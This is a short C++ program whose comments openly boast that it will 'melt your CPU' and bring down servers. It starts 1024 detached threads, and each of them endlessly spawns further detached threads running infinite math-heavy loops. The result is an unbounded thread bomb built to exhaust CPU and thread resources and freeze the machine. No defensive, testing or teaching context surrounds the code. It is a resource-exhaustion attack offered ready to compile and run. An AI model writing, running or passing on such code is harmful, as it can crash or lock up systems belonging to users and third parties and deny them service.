// NOTE : THIS TOTALLY FOCUSES ON MELTING YOUR CPU , EVEN SERVERS WONT SURVIVE IT
// [[[[[[[[[[[[[[[   MAY GOD HAVE MERCY ON YOUR CPU ]]]]]]]]]]]]]]]]]]]

#include <iostream>
#include <thread>
#include <vector>
#include <cmath>
#include <cstdlib>

// **MELTS YOUR CPU INSTANTLY**
void nuclearBurn() {
    while (true) {
        volatile double x = 1.0;
        for (int i = 0; i < 100000000; i++) {
            x = std::pow(x, 1000000); // Exponential explosion
            x = std::sqrt(x); // Square root slow down
            x = std::log(x + 1.00001); // Logarithmic death
            x = std::exp(x); // Exponential again, LOL
            x = std::sin(x) * std::cos(x) * std::tan(x) * std::atan(x);
        }
    }
}

// **UNSTOPPABLE THREAD CREATION**
void threadSpawner() {
    while (true) {
        std::thread(nuclearBurn).detach(); // INFINITE THREADS
    }
}

int main() {
    std::cout << "💀 CPU APOCALYPSE STARTED. NO ESCAPE. 💀" << std::endl;

    // Start MAXIMUM THREAD DESTRUCTION
    for (int i = 0; i < 1024; i++) { // SPAWN 1024 THREADS INSTANTLY
        std::thread(threadSpawner).detach();
    }

    // LOCK SYSTEM IN A BLACK HOLE
    while (true) {}

    return 0;
}
